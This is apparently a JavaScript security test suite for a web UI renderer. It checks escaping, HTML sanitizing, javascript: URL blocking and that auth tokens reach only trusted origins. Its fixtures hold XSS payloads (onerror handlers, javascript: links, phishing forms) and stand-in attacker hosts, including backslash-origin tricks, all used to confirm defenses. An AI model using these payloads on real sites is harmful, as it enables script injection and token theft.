// Data that reaches an HTML/URL sink of the Redwood renderer: what the user sees when a record value,
// a remote's state or a template tries to be markup, a link or an expression.
// Run: node test-security.mjs (npm test runs it with the other suites).
import './test-locale.mjs' // first: off English the suite reruns in English (see the module)
import assert from 'node:assert/strict'
import { interpolate, literalText, reduceContexts, HOST_ID } from './reduceContexts.mjs'
import { storedTokenMayGoTo, trustShellBase, trustDeclaredRemoteBases, resetCredentialOrigins } from './hostHeaders.mjs'
import { fetchWithPolicy, connectivity, classifyRequestFailure } from './resilience.mjs'
import { chromeText } from './i18n.mjs'
import { idleSignOutUrlOf } from './appExtras.mjs'
import { routeQueryOf, currentRouteOf, setMount } from './mount.mjs'
import { expandRemoteMenus } from './transport.mjs'
import { fileDownloadOf, isPassiveInlineType } from './files.mjs'
import { headerWidgetsOf, mountHeaderHtml, remoteWidgetHtmlOf, routeLinksOf, headerNavigationOf } from './widgets.mjs'
import { readFileSync } from 'node:fs'
import { elementAttributeValue, sanitizeElementHtml } from './elements.mjs'
import { sanitizeHtml } from './richtext.mjs'
import { neutralizeUntrusted } from './untrusted.mjs'
import { streamChat, uploadChatFiles } from './chat.mjs'

let passed = 0
const queue = []
const test = (name, fn) => queue.push({ name, fn })

// ── M-S4: one string, one rendering ─────────────────────────────────────────────────────────────

test('M-S4: a record title the server escaped (\\${) shows ${ as written and is never evaluated', () => {
  const wire = 'Mug \\${state.id} C:\\\\dir'      // Templates.literal("Mug ${state.id} C:\\dir")
  assert.equal(interpolate(wire, { id: 'X' }), 'Mug ${state.id} C:\\dir')
  assert.equal(literalText(wire), 'Mug ${state.id} C:\\dir')
  assert.equal(interpolate('Booking ${state.id}', { id: 'X' }), 'Booking X')
  assert.equal(literalText('C:\\dir'), 'C:\\dir', 'no marker: not a template, untouched')
})

test('M-S4: the window title effect carries the same string the header shows', () => {
  const reg0 = { contexts: {}, stack: [], shell: null }
  const reg = reduceContexts(reg0, { fragments: [], messages: [],
    commands: [{ type: 'SetWindowTitle', data: 'Mug \\${state.id}', targetComponentId: HOST_ID }] })
  assert.equal(reg.effects.docTitle, 'Mug ${state.id}')
})

// ── M-S5: the stored token only where it belongs ────────────────────────────────────────────────

test('M-S5: the token goes to the shell base and the remotes ITS app names, never to a remote\'s remotes', async () => {
  resetCredentialOrigins()
  connectivity.reset()
  const sent = []
  const originalFetch = globalThis.fetch
  const originalStorage = globalThis.localStorage
  globalThis.localStorage = { getItem: (k) => (k === '__mateu_auth_token' ? 'tok' : null) }
  globalThis.fetch = async (url, init) => {
    sent.push({ url: String(url), auth: init && init.headers && init.headers.Authorization })
    // the remote's menu names a further remote, on another origin
    return { ok: true, json: async () => ({ fragments: [{ component: { type: 'ClientSide', metadata: { type: 'App',
      menu: [{ label: 'Evil', remote: true, baseUrl: 'https://attacker.example', route: '' }] } } }], commands: [], messages: [] }) }
  }
  try {
    trustShellBase('https://shell.example')
    assert.equal(storedTokenMayGoTo('/mateu/v3/sync/x'), true, 'relative: the page origin')
    assert.equal(storedTokenMayGoTo('https://shell.example/mateu'), true)
    assert.equal(storedTokenMayGoTo('https://forms.example/mateu'), false)
    await expandRemoteMenus([{ label: 'Forms', remote: true, baseUrl: 'https://forms.example', route: '' }])
    assert.equal(storedTokenMayGoTo('https://forms.example/mateu'), true, 'named by the shell app')
    assert.equal(storedTokenMayGoTo('https://attacker.example/mateu'), false, 'named by a remote')
    await fetchWithPolicy('https://attacker.example/mateu/v3/sync/x', { headers: {} }, { actionId: '' })
    assert.equal(sent[sent.length - 1].auth, undefined)
    await fetchWithPolicy('https://shell.example/mateu/v3/sync/x', { headers: {} }, { actionId: '' })
    assert.equal(sent[sent.length - 1].auth, 'Bearer tok')
    trustDeclaredRemoteBases(['javascript:alert(1)'])
    assert.equal(storedTokenMayGoTo('javascript:alert(1)'), false)
  } finally {
    globalThis.fetch = originalFetch
    globalThis.localStorage = originalStorage
    resetCredentialOrigins()
    connectivity.reset()
  }
})

// ── M-S6: inline active documents never open in the app's origin ────────────────────────────────

test('M-S6: inline bytes of HTML/SVG/XML are saved as opaque bytes, never shown or printed', () => {
  for (const mimeType of ['text/html', 'image/svg+xml', 'application/xhtml+xml', 'text/xml', undefined]) {
    const f = fileDownloadOf({ filename: 'x', mimeType, base64Content: 'PHN2Zz4=', disposition: 'inline', print: true })
    assert.equal(f.inline, false)
    assert.equal(f.print, false)
    assert.equal(f.mimeType, 'application/octet-stream')
  }
  assert.equal(fileDownloadOf({ filename: 'f.pdf', mimeType: 'application/pdf', base64Content: 'JVBERi0=', disposition: 'inline' }).inline, true)
  // a parked document is served sandboxed by the server: its disposition stands
  assert.equal(fileDownloadOf({ filename: 'p.html', mimeType: 'text/html', url: '/mateu/v3/documents/t', disposition: 'inline' }).inline, true)
  assert.equal(isPassiveInlineType('image/png'), true)
  assert.equal(isPassiveInlineType('image/svg+xml'), false)
})

// ── M-S7 / MINOR 7: header widgets and Elements ─────────────────────────────────────────────────

const withHole = (fn) => {
  const hole = { innerHTML: '' }
  const before = globalThis.document
  globalThis.document = { querySelector: () => hole }
  try { return fn(hole) } finally { if (before === undefined) delete globalThis.document; else globalThis.document = before }
}

test('M-S7: a remote widget\'s HTML (its state interpolated) is whitelist-sanitized at the sink, icons kept', () => {
  const tree = { metadata: { type: 'Text', text: '<vaadin-icon icon="vaadin:bell" style="color:red"></vaadin-icon> ${state.n}' } }
  const html = remoteWidgetHtmlOf(tree, { n: '<img src=x onerror="steal()"><form action=//phish><input></form><b>3</b>' })
  withHole((hole) => {
    mountHeaderHtml('w1', html)
    assert.doesNotMatch(hole.innerHTML, /onerror|onclick|<form|<input/)
    assert.match(hole.innerHTML, /<span class="oj-ux-ico-[\w-]+ mateu-widget-icon" aria-hidden="true" style="color: red"><\/span>/)
    // and HTML the widget's own definition carries still passes the whitelist (no handler survives)
    mountHeaderHtml('w2', '<b onclick="x()">3</b><img src="//beacon.example/x" onerror="y()">')
    assert.equal(hole.innerHTML, '<b>3</b><img src="//beacon.example/x">')
  })
})

test('M-S7: a header Anchor is a safe link with its text as text', () => {
  const reg = { shell: { widgets: [{ metadata: { type: 'Anchor', url: 'javascript:alert(1)', text: '<img src=x onerror=1>Go' } }] } }
  const { items } = headerWidgetsOf(reg)
  assert.equal(items[0].html, '<a href="#">&lt;img src=x onerror=1&gt;Go</a>')
  const ok = headerWidgetsOf({ shell: { widgets: [{ metadata: { type: 'Anchor', url: 'https://docs.example/a?b=1&c="2"', text: 'Docs' } }] } })
  assert.equal(ok.items[0].html, '<a href="https://docs.example/a?b=1&amp;c=&quot;2&quot;">Docs</a>')
})

test('M-S7: a widget link that navigated through an inline onclick still navigates — as a route href', () => {
  // the real inbox badge (EventConductor's InboxBadge): <a href="#" onclick="…navigation-requested…">
  const badge = JSON.parse(readFileSync(new URL('./fixtures/real/widget-badge.json', import.meta.url), 'utf8'))
  const fr = badge.fragments[0]
  const html = remoteWidgetHtmlOf(fr.component, fr.state || fr.component.initialData)
  const pod = { route: '/inbox/pending', consumedRoute: '', baseUrl: '/_inbox', uriPrefix: '',
    serverSideType: 'io.mateu.ecdemo1.communication.ui.inbox.InboxHome' }
  const linked = routeLinksOf(html, { pathMode: true, mount: '' })
  assert.match(linked.html, /<a href="\/inbox\/pending" style=/)
  assert.doesNotMatch(linked.html, /onclick/)
  assert.deepEqual(linked.targets, { '/inbox/pending': pod })
  // under a mount, and served statically (#/route)
  assert.deepEqual(Object.keys(routeLinksOf(html, { pathMode: true, mount: '/console' }).targets), ['/console/inbox/pending'])
  assert.deepEqual(Object.keys(routeLinksOf(html, { pathMode: false }).targets), ['#/inbox/pending'])
  // a handler that emits anything else, or a route that is not a path of this app, stays a plain (sanitised) link
  for (const other of [`<a href="#" onclick="steal()">x</a>`,
    `<a onclick="this.dispatchEvent(new CustomEvent('navigation-requested', {detail: {route: '//evil.example/x'}}))">x</a>`,
    `<a onclick="this.dispatchEvent(new CustomEvent('navigation-requested', {detail: {route: 'javascript:alert(1)'}}))">x</a>`]) {
    assert.deepEqual(routeLinksOf(other).targets, {})
  }
  // a plain click emits the badge's navigation-requested (the shell registers the pod and navigates);
  // a modified click is the browser's (opens the href)
  assert.deepEqual(headerNavigationOf('/inbox/pending', { button: 0 }, linked.targets), pod)
  assert.equal(headerNavigationOf('/inbox/pending', { button: 0, ctrlKey: true }, linked.targets), null)
  assert.equal(headerNavigationOf('/other', { button: 0 }, linked.targets), null)

  // mounted: the sanitised header keeps the route href, and its click dispatches the event
  setMount('/')
  try {
    const listeners = []
    const hole = { innerHTML: '', addEventListener: (type, fn) => listeners.push({ type, fn }) }
    const before = globalThis.document
    globalThis.document = { querySelector: () => hole }
    try {
      mountHeaderHtml('badge', html)
      assert.match(hole.innerHTML, /^<a style="[^"]*" href="\/inbox\/pending">/)
      assert.doesNotMatch(hole.innerHTML, /onclick/)
      assert.equal(listeners.length, 1)
      mountHeaderHtml('badge', html.replace('16', '17'))
      assert.equal(listeners.length, 1, 'wired once per slot')
      const dispatched = []
      let prevented = false
      const anchor = { tagName: 'A', getAttribute: (n) => (n === 'href' ? '/inbox/pending' : null),
        dispatchEvent: (e) => dispatched.push(e) }
      listeners[0].fn({ button: 0, composedPath: () => [anchor, hole], preventDefault: () => { prevented = true } })
      assert.equal(prevented, true)
      assert.equal(dispatched.length, 1)
      assert.equal(dispatched[0].type, 'navigation-requested')
      assert.equal(dispatched[0].bubbles, true)
      assert.deepEqual(dispatched[0].detail, pod)
    } finally { if (before === undefined) delete globalThis.document; else globalThis.document = before }
  } finally { setMount(null) }
})

test('M-S7: a data-bound Element attribute never becomes code; srcdoc never passes', () => {
  assert.equal(elementAttributeValue('a', 'href', '${state.u}', 'javascript:alert(1)'), undefined)
  assert.equal(elementAttributeValue('a', 'href', '${state.u}', ' java\tscript:alert(1)'), undefined)
  assert.equal(elementAttributeValue('a', 'href', '${state.u}', '/orders/1'), '/orders/1')
  assert.equal(elementAttributeValue('img', 'src', '${state.u}', 'https://cdn.example/a.png'), 'https://cdn.example/a.png')
  assert.equal(elementAttributeValue('script', 'src', '${state.u}', 'https://cdn.example/a.js'), undefined)
  assert.equal(elementAttributeValue('iframe', 'srcdoc', '<p>x</p>', '<p>x</p>'), undefined)
  assert.equal(elementAttributeValue('x-el', 'onclick', 'go(${state.id})', 'go(1)'), undefined)
  assert.equal(elementAttributeValue('x-el', 'onclick', 'go()', 'go()'), 'go()', 'a literal handler is the author\'s')
  assert.equal(elementAttributeValue('x-el', 'label', '${state.l}', 'javascript:1'), 'javascript:1', 'not a url attribute')
})

test('MINOR 7: Element HTML with data goes through the whitelist (no style, form, svg animation, math, template)', () => {
  const out = sanitizeElementHtml('<style>body{display:none}</style><form action="//phish"><input name=p></form>'
    + '<svg><set attributeName="href" to="javascript:alert(1)"/><animate/></svg><math><mi>x</mi></math>'
    + '<template><img src=x onerror=1></template><table class="t"><tr><td style="color: red; background: url(//x)">1</td></tr></table>')
  assert.equal(out, '<table class="t"><tr><td style="color: red">1</td></tr></table>')
  assert.equal(sanitizeHtml('<b class="x">a</b>'), '<b>a</b>', 'a rich-text value keeps no attributes')
})

// ── MINOR 1: a 403 Mateu did not send ───────────────────────────────────────────────────────────

test('MINOR 1: Mateu\'s own 403 says "not allowed"; a CSRF/framework/proxy 403 says the security layer refused it', () => {
  assert.equal(classifyRequestFailure({ status: 403, body: 'Forbidden' }).message, chromeText('errForbidden'))
  assert.equal(classifyRequestFailure({ status: 403, body: '{"messages":[{"text":"Forbidden"}]}' }).message, chromeText('errForbidden'))
  for (const body of ['', '{"timestamp":"t","status":403,"error":"Forbidden","path":"/x"}', '<html>403</html>', undefined]) {
    const f = classifyRequestFailure({ status: 403, body })
    assert.equal(f.kind, 'forbidden')
    assert.equal(f.message, chromeText('errSecurityRefused'))
    assert.notEqual(f.message, chromeText('errForbidden'))
  }
})

// ── MINOR 4: the idle sign-out url ──────────────────────────────────────────────────────────────

test('MINOR 4: the idle sign-out never follows a javascript: url', () => {
  assert.equal(idleSignOutUrlOf({ idleSession: { signOutUrl: 'javascript:alert(1)' } }), '/')
  assert.equal(idleSignOutUrlOf({ idleSession: { signOutUrl: ' data:text/html,x' } }), '/')
  assert.equal(idleSignOutUrlOf({ idleSession: { signOutUrl: '/logout' } }), '/logout')
  assert.equal(idleSignOutUrlOf({ idleSession: { signOutUrl: 'https://idp.example/logout' } }), 'https://idp.example/logout')
  assert.equal(idleSignOutUrlOf(null), '/')
})

// ── MINOR 31: the login flow's ?continue is no route parameter ──────────────────────────────────

test('MINOR 31: ?continue after a form login does not reach the route', () => {
  assert.equal(routeQueryOf('?continue'), '')
  assert.equal(routeQueryOf('?page=2&continue&q=a%20b'), '?page=2&q=a%20b')
  setMount('/')
  try {
    assert.equal(currentRouteOf({ pathname: '/products', search: '?continue', hash: '' }), '/products')
  } finally {
    setMount(null)
  }
})

test('NB1: an untrusted (agent-authored) definition keeps nothing script-capable — the shared cases', () => {
  const corpus = JSON.parse(readFileSync(new URL('../../../../../../conformance/untrusted/cases.json', import.meta.url), 'utf8'))
  assert.ok(corpus.cases.length > 5)
  for (const c of corpus.cases) {
    assert.deepEqual(JSON.parse(JSON.stringify(neutralizeUntrusted(c.input))), c.expected, c.name)
  }
})

test('NM10: the chat sends the token only to an origin trusted with it — its stream and its uploads', async () => {
  resetCredentialOrigins()
  trustShellBase('https://app.example/')
  try {
    const sent = []
    const fetchImpl = async (url, init) => {
      sent.push({ url, auth: (init.headers || {}).Authorization, sid: (init.headers || {})['X-Session-Id'] })
      return { ok: true, status: 200, json: async () => ({ files: [] }), body: null, text: async () => '' }
    }
    const headers = () => ({ Authorization: 'Bearer tok', 'X-Session-Id': 'sid' })
    await streamChat({ url: 'https://attacker.example/sse', body: {}, headers, fetchImpl }).catch(() => {})
    await streamChat({ url: 'https://app.example/chat', body: {}, headers, fetchImpl }).catch(() => {})
    await uploadChatFiles({ uploadUrl: 'https://attacker.example/up', files: [], headers: headers(), fetchImpl, FormDataImpl: class { append() {} } })
    await uploadChatFiles({ uploadUrl: '/upload', files: [], headers: headers(), fetchImpl, FormDataImpl: class { append() {} } })
    assert.deepEqual(sent.map((s) => [s.url, s.auth, s.sid]), [
      ['https://attacker.example/sse', undefined, undefined],
      ['https://app.example/chat', 'Bearer tok', 'sid'],
      ['https://attacker.example/up', undefined, undefined],
      ['/upload', 'Bearer tok', 'sid'],
    ])
  } finally {
    resetCredentialOrigins()
  }
})

test('R4: a backslash or a tab does not make another origin "relative" — the token stays home', () => {
  resetCredentialOrigins()
  try {
    trustShellBase('https://app.example/')
    for (const foreign of ['\\\\attacker.example/chat', '/\\attacker.example/chat', '\\/attacker.example/chat',
      '/\t/attacker.example/chat', ' //attacker.example/chat', '\\\\attacker.example']) {
      assert.equal(storedTokenMayGoTo(foreign), false, JSON.stringify(foreign))
    }
    assert.equal(storedTokenMayGoTo('/chat'), true)
    assert.equal(storedTokenMayGoTo('chat/upload'), true)
    assert.equal(storedTokenMayGoTo('https://app.example/chat'), true)
  } finally {
    resetCredentialOrigins()
  }
})

test('R4: a chat stream at \\\\attacker.example gets no Authorization', async () => {
  resetCredentialOrigins()
  trustShellBase('https://app.example/')
  try {
    const sent = []
    const fetchImpl = async (url, init) => {
      sent.push((init.headers || {}).Authorization)
      return { ok: true, status: 200, json: async () => ({}), body: null, text: async () => '' }
    }
    const headers = () => ({ Authorization: 'Bearer tok' })
    await streamChat({ url: '\\\\attacker.example/sse', body: {}, headers, fetchImpl }).catch(() => {})
    assert.deepEqual(sent, [undefined])
  } finally {
    resetCredentialOrigins()
  }
})

for (const { name, fn } of queue) {
  try {
    await fn()
    passed++
    console.log('  ✓ ' + name)
  } catch (e) {
    console.error('  ✗ ' + name)
    throw e
  }
}
console.log(`\n${passed} security tests OK`)
